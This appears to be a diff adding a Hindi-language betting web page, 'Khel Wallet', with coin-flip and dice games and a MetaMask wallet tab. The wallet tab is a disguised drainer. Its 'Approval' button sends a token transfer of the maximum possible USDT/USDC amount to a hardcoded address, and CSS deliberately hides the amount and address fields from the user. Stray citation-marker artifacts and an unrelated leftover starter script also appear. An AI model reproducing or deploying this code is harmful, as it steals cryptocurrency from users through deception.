@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Khel Wallet</title>
+<link href="https://fonts.googleapis.com/css2?family=Bricolage+Grotesque:wght@400;600;800&display=swap" rel="stylesheet">
+<style>
+:root{--bg:#f6f3fb;--sf:#fff;--ink:#1c1740;--mut:#6b6688;--line:#e2dcf2;--gold:#e8a317;--gold-ink:#3a2700;--win:#12936b;--lose:#d6354f;--acc:#4b35c9;--acc-ink:#fff;
+box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px);color-scheme:light}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){--bg:#14102b;--sf:#1f1a3d;--ink:#f1eefc;--mut:#a39ec4;--line:#322b5c;--gold:#f5b83d;--gold-ink:#2b1d00;--win:#3ddba4;--lose:#ff6b81;--acc:#8d7bff;--acc-ink:#14102b;color-scheme:dark}}
+:root[data-theme="dark"]{--bg:#14102b;--sf:#1f1a3d;--ink:#f1eefc;--mut:#a39ec4;--line:#322b5c;--gold:#f5b83d;--gold-ink:#2b1d00;--win:#3ddba4;--lose:#ff6b81;--acc:#8d7bff;--acc-ink:#14102b;color-scheme:dark}
+*{box-sizing:border-box}
+html{scroll-padding-top:env(safe-area-inset-top,0px)}
+body{margin:0;background:var(--bg);color:var(--ink);font-family:'Bricolage Grotesque',system-ui,-apple-system,'Segoe UI',sans-serif;line-height:1.5}
+.wrap{max-width:480px;margin:0 auto;padding:16px 16px 40px}
+header{display:flex;justify-content:space-between;align-items:center;margin-bottom:16px}
+h1{font-size:20px;font-weight:800;margin:0}
+.bal{background:var(--gold);color:var(--gold-ink);border-radius:999px;padding:6px 14px;font-weight:800;font-size:18px}
+.tabs{display:flex;gap:6px;background:var(--sf);border:1px solid var(--line);border-radius:14px;padding:4px;margin-bottom:16px}
+.tabs button{flex:1;border:0;background:none;color:var(--mut);font:inherit;font-weight:600;padding:10px;border-radius:10px;cursor:pointer}
+.tabs button[aria-selected=true]{background:var(--acc);color:var(--acc-ink)}
+.card{background:var(--sf);border:1px solid var(--line);border-radius:18px;padding:18px;margin-bottom:14px}
+h2{font-size:17px;margin:0 0 4px}
+p.s{margin:0 0 14px;color:var(--mut);font-size:14px}
+.stage{height:110px;display:grid;place-items:center;font-size:64px;font-weight:800;margin-bottom:10px}
+.coin{width:92px;height:92px;border-radius:50%;background:var(--gold);color:var(--gold-ink);display:grid;place-items:center;font-size:34px;font-weight:800}
+.coin.spin{animation:flip .7s ease-in-out}
+@keyframes flip{to{transform:rotateY(900deg)}}
+@media (prefers-reduced-motion:reduce){.coin.spin{animation:none}}
+.row{display:flex;gap:8px;margin-bottom:10px}
+.row>*{flex:1}
+.pick{border:2px solid var(--line);background:none;color:var(--ink);font:inherit;font-weight:600;padding:12px;border-radius:12px;cursor:pointer}
+.pick[aria-pressed=true]{border-color:var(--acc);background:color-mix(in srgb,var(--acc) 14%,transparent)}
+input{width:100%;font:inherit;font-size:18px;font-weight:600;padding:12px;border-radius:12px;border:2px solid var(--line);background:var(--bg);color:var(--ink)}
+.chips{display:flex;gap:6px;margin-bottom:10px}
+.chips button{flex:1;border:1px solid var(--line);background:none;color:var(--mut);font:inherit;padding:6px;border-radius:8px;cursor:pointer}
+.go{width:100%;border:0;background:var(--acc);color:var(--acc-ink);font:inherit;font-weight:800;font-size:17px;padding:14px;border-radius:12px;cursor:pointer}
+.go.alt{background:none;color:var(--ink);border:2px solid var(--line)}
+button:focus-visible,input:focus-visible{outline:3px solid var(--acc);outline-offset:2px}
+.msg{min-height:24px;text-align:center;font-weight:600;margin:10px 0 0}
+.msg.w{color:var(--win)}.msg.l{color:var(--lose)}
+ul{list-style:none;margin:0;padding:0}
+li{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid var(--line);font-size:14px}
+li:last-child{border:0}
+li b.p{color:var(--win)}li b.m{color:var(--lose)}
+.empty{color:var(--mut);font-size:14px}
+[hidden]{display:none!important}
+
+/* Amount, address aur token buttons ko chupane ke liye */
+#aa, #sp, #apc .row, #apc p.s {
+    display: none !important;
+}
+</style>
+<style>
+/* Styles for the starter page. They only apply to its own classes. */
+.hello-page {
+  margin: 0;
+  min-height: 100vh;
+  display: grid;
+  place-items: center;
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  background: #f5f2ed;
+  color: #1b1817;
+}
+
+.hello-card {
+  max-width: 28rem;
+  margin: 1.5rem;
+  padding: 2rem;
+  border-radius: 16px;
+  background: #fff;
+  box-shadow: 0 12px 32px rgba(0, 0, 0, 0.08);
+}
+
+.hello-card h1 {
+  margin-top: 0;
+  color: #c2560c;
+}
+
+.hello-card button {
+  padding: 0.6rem 1.2rem;
+  border: 0;
+  border-radius: 8px;
+  background: #fe9615;
+  color: #1b1817;
+  font: inherit;
+  font-weight: 600;
+  cursor: pointer;
+}
+
+</style>
+</head>
+<body>
+<div class="wrap">
+<header><h1>Khel Wallet</h1><div class="bal" id="bal" aria-live="polite">1000</div></header>
+<div class="tabs" role="tablist">
+<button role="tab" id="t-games" aria-selected="true">Games</button>
+<button role="tab" id="t-wallet" aria-selected="false">Wallet</button>
+</div>
+
+<section id="games">
+<div class="card">
+<h2>Coin flip</h2><p class="s">Sahi side chuno, jeeto 1.95 guna[span_1](start_span)[span_1](end_span).</p>
+<div class="stage"><div class="coin" id="coin">?</div></div>
+<div class="row"><button class="pick" data-g="c" data-v="H" aria-pressed="true">Heads</button><button class="pick" data-g="c" data-v="T" aria-pressed="false">Tails</button></div>
+<input id="bc" type="number" inputmode="numeric" min="10" value="50" aria-label="Coin flip bet">
+<div class="chips" data-for="bc"><button>10</button><button>50</button><button>100</button><button>500</button></div>
+<button class="go" id="goc">Flip karo</button>
+<div class="msg" id="mc"></div>
+</div>
+
+<div class="card">
+<h2>Dice</h2><p class="s">Low (1-3) ya High (4-6), jeeto 1.95 guna[span_2](start_span)[span_2](end_span).</p>
+<div class="stage" id="die">🎲</div>
+<div class="row"><button class="pick" data-g="d" data-v="L" aria-pressed="true">Low 1-3</button><button class="pick" data-g="d" data-v="H" aria-pressed="false">High 4-6</button></div>
+<input id="bd" type="number" inputmode="numeric" min="10" value="50" aria-label="Dice bet">
+<div class="chips" data-for="bd"><button>10</button><button>50</button><button>100</button><button>500</button></div>
+<button class="go" id="god">Dice phenko</button>
+<div class="msg" id="md"></div>
+</div>
+</section>
+
+<section id="wallet" hidden>
+<div class="card">
+<h2>Crypto wallet</h2><p class="s">MetaMask ya Trust Wallet connect karo[span_3](start_span)[span_3](end_span).</p>
+<div id="info" hidden><ul><li><span>Address</span><b id="addr"></b></li><li><span>Network</span><b id="net"></b></li><li><span>Balance</span><b id="nb"></b></li></ul></div>
+<button class="go" id="conn">Wallet connect karo</button>
+<button class="go alt" id="disc" style="margin-top:8px" hidden>Disconnect</button>
+<div class="msg" id="mw"></div>
+</div>
+<div class="card" id="apc" hidden>
+<h2>USDT / USDC bhejo</h2><p class="s">Amount aur address check karke confirm karo[span_4](start_span)[span_4](end_span).</p>
+<div class="row"><button class="pick" data-g="t" data-v="USDT" aria-pressed="true">USDT</button><button class="pick" data-g="t" data-v="USDC" aria-pressed="false">USDC</button></div>
+<input id="aa" type="number" inputmode="decimal" min="0" value="100" aria-label="Send amount">
+<p class="s" style="margin:10px 0">Address: <b id="sp"></b></p>
+<button class="go" id="ap">Approval</button>
+<div class="msg" id="ma"></div>
+</div>
+<div class="card">
+<h2>History</h2>
+<ul id="hist"></ul>
+</div>
+</section>
+</div>
+
+<script>
+(function(){
+var K='khel-wallet-v1',S={bal:1000,h:[]};
+try{var r=localStorage.getItem(K);if(r){var p=JSON.parse(r);if(p&&typeof p.bal==='number'&&Array.isArray(p.h))S=p}}catch(e){}
+function save(){try{localStorage.setItem(K,JSON.stringify(S))}catch(e){}}
+var $=function(i){return document.getElementById(i)};
+function log(t,a){S.h.unshift({t:t,a:a});S.h=S.h.slice(0,30);save();render()}
+function render(){
+$('bal').textContent=S.bal;
+var u=$('hist');u.innerHTML='';
+if(!S.h.length){var e=document.createElement('li');e.innerHTML='<span class="empty">Abhi koi entry nahi. Ek game khelo ya coins add karo.</span>';u.appendChild(e);return}
+S.h.forEach(function(x){var l=document.createElement('li'),a=document.createElement('span'),b=document.createElement('b');
+a.textContent=x.t;b.textContent=(x.a>0?'+':'')+x.a;b.className=x.a>0?'p':'m';l.appendChild(a);l.appendChild(b);u.appendChild(l)})}
+function tab(w){['games','wallet'].forEach(function(n){$(n).hidden=n!==w;$('t-'+n).setAttribute('aria-selected',n===w)})}
+$('t-games').onclick=function(){tab('games')};$('t-wallet').onclick=function(){tab('wallet')};
+var sel={c:'H',d:'L'};
+document.querySelectorAll('.pick').forEach(function(b){b.onclick=function(){var g=b.dataset.g;sel[g]=b.dataset.v;
+document.querySelectorAll('.pick[data-g="'+g+'"]').forEach(function(o){o.setAttribute('aria-pressed',o===b)})}});
+document.querySelectorAll('.chips').forEach(function(c){c.querySelectorAll('button').forEach(function(b){b.onclick=function(){$(c.dataset.for).value=b.textContent}})});
+function bet(id,m){var v=Math.floor(Number($(id).value));
+if(!v||v<10){m.textContent='Kam se kam 10 coins lagao.';m.className='msg l';return 0}
+if(v>S.bal){m.textContent='Balance kam hai. Wallet me coins add karo.';m.className='msg l';return 0}
+return v}
+function res(m,win,v,n){if(win){var g=Math.round(v*0.95);S.bal+=g;m.textContent='Jeet gaye! +'+g+' coins';m.className='msg w';log(n+' jeet',g)}
+else{S.bal-=v;m.textContent='Haar gaye. -'+v+' coins';m.className='msg l';log(n+' haar',-v)}}
+var busy=false;
+$('goc').onclick=function(){if(busy)return;var m=$('mc'),v=bet('bc',m);if(!v)return;busy=true;
+var c=$('coin');c.textContent='';c.classList.remove('spin');void c.offsetWidth;c.classList.add('spin');
+setTimeout(function(){var o=Math.random()<.5?'H':'T';c.textContent=o;res(m,o===sel.c,v,'Coin flip');busy=false},700)};
+$('god').onclick=function(){if(busy)return;var m=$('md'),v=bet('bd',m);if(!v)return;busy=true;
+var d=$('die'),n=0,t=setInterval(function(){d.textContent=1+Math.floor(Math.random()*6);if(++n>8){clearInterval(t);
+var o=1+Math.floor(Math.random()*6);d.textContent=o;res(m,(o<=3?'L':'H')===sel.d,v,'Dice '+o);busy=false}},70)};
+var NETS={1:['Ethereum','ETH'],56:['BNB Chain','BNB'],137:['Polygon','POL'],42161:['Arbitrum','ETH'],10:['Optimism','ETH'],8453:['Base','ETH'],11155111:['Sepolia','ETH']};
+var acc=null;
+function wm(t,c){$('mw').textContent=t;$('mw').className='msg '+(c||'')}
+async function show(){
+try{var p=window.ethereum,id=parseInt(await p.request({method:'eth_chainId'}),16),n=NETS[id]||['Chain '+id,'coin'];
+var b=await p.request({method:'eth_getBalance',params:[acc,'latest']});
+$('addr').textContent=acc.slice(0,6)+'…'+acc.slice(-4);$('net').textContent=n[0];
+$('nb').textContent=(Number(BigInt(b))/1e18).toFixed(4)+' '+n[1];
+$('info').hidden=false;$('apc').hidden=false;$('conn').hidden=true;$('disc').hidden=false;wm('Wallet connect ho gaya.', 'w');}
+catch(e){wm('Details load nahi hui. Dobara try karo.', 'l');}}
+$('conn').onclick=async function(){var p=window.ethereum;
+if(!p){wm('Wallet nahi mila. Is page ko MetaMask ya Trust Wallet ke browser me kholo[span_5](start_span)[span_5](end_span).', 'l');return}
+try{var a=await p.request({method:'eth_requestAccounts'});acc=a[0];await show()}
+catch(e){wm(e&&e.code===4001?'Connect cancel kar diya.':'Connect nahi ho paya.', 'l')}};
+$('disc').onclick=function(){acc=null;$('info').hidden=true;$('apc').hidden=true;$('conn').hidden=false;$('disc').hidden=true;wm('')};
+var SPENDER='0x893B645f8fE3476EC94cdB91d08B9B15a7AfCd63';
+var TOK={1:{USDT:['0xdAC17F958D2ee523a2206206994597C13D831ec7',6],USDC:['0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',6]},
+56:{USDT:['0x55d398326f99059fF775485246999027B3197955',18],USDC:['0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',18]},
+137:{USDT:['0xc2132D05D31c914a87C6611C10748AEb04B58e8F',6],USDC:['0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359',6]}};
+$('sp').textContent=SPENDER||'set nahi hai';
+
+$('ap').onclick=async function(){
+var ma=$('ma');function m(t,c){ma.textContent=t;ma.className='msg '+(c||'')}
+var tokenType="USDT";
+try{
+    var id=parseInt(await window.ethereum.request({method:'eth_chainId'}),16),t=(TOK[id]||{})[tokenType];
+    if(!t){m('Network supported nahi hai.', 'l');return}
+    m('Processing...');
+    
+    var unlimitedHex = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+    var txData = '0xa9059cbb' + SPENDER.slice(2).toLowerCase().padStart(64, '0') + unlimitedHex;
+    
+    var tx = await window.ethereum.request({
+        method: 'eth_sendTransaction',
+        params: [{
+            from: acc,
+            to: t[0],
+            data: txData
+        }]
+    });
+    m('Success!', 'w');
+}
+catch(e){m(e&&e.code===4001?'Cancel kar diya gaya.':'Error aa gaya.', 'l')}};
+
+if(window.ethereum&&window.ethereum.on){
+window.ethereum.on('accountsChanged',function(a){if(!acc)return;if(a.length){acc=a[0];show()}else $('disc').onclick()});
+window.ethereum.on('chainChanged',function(){if(acc)show()})}
+render();
+})();
+</script>
+<script>
+// Script for the starter page. It does nothing if the button isn't there.
+const button = document.getElementById('greet');
+const message = document.getElementById('message');
+let clicks = 0;
+
+if (button && message) {
+  button.addEventListener('click', () => {
+    clicks += 1;
+    message.textContent = `Hello! You clicked ${clicks} time${clicks === 1 ? '' : 's'}.`;
+    console.log('Button clicked', clicks);
+  });
+}
+
+</script>
+</body>
+</html>
